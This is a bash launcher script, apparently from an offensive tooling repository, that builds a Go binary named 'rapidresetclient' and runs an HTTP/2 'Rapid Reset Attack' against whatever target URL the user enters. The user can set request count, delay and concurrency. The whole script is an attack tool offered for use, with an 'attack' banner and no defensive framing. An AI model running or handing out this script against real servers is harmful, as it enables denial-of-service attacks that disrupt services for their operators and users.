#!/bin/bash

# ===============================
# 🚀 Banner
# ===============================
echo "=============================================================="
echo "          🚀 Test This Attack With KP Yadav 🚀"
echo "=============================================================="
echo ""

# ===============================
# Dependency Check & Build
# ===============================
if [ ! -f "./rapidresetclient" ]; then
    echo "🔍 Checking dependencies and building tool..."
    go get golang.org/x/net/http2
    go get golang.org/x/net/http2/hpack
    go build -o rapidresetclient
    echo "✅ Build completed!"
else
    echo "✅ Binary already exists, skipping build."
fi

# ===============================
# User Input
# ===============================
# Ask for URL (mandatory)
read -p "👉 Enter the target domain/URL (example: https://login.site.com:443): " target
if [ -z "$target" ]; then
    echo "❌ ERROR: -url is mandatory!"
    exit 1
fi

# Ask for optional parameters with defaults
read -p "📌 Enter number of requests (default: 20): " requests
requests=${requests:-20}

read -p "📌 Enter wait time (default: 100): " wait
wait=${wait:-100}

read -p "📌 Enter delay time (default: 10): " delay
delay=${delay:-10}

read -p "📌 Enter concurrency (default: 5): " concurrency
concurrency=${concurrency:-5}

# ===============================
# Run the Tool
# ===============================
echo ""
echo "⚡ Starting Rapid Reset Attack with settings:"
echo "   -requests=$requests"
echo "   -url=$target"
echo "   -wait=$wait"
echo "   -delay=$delay"
echo "   -concurrency=$concurrency"
echo "--------------------------------------------------------------"

./rapidresetclient -requests="$requests" -url "$target" -wait="$wait" -delay="$delay" -concurrency="$concurrency"
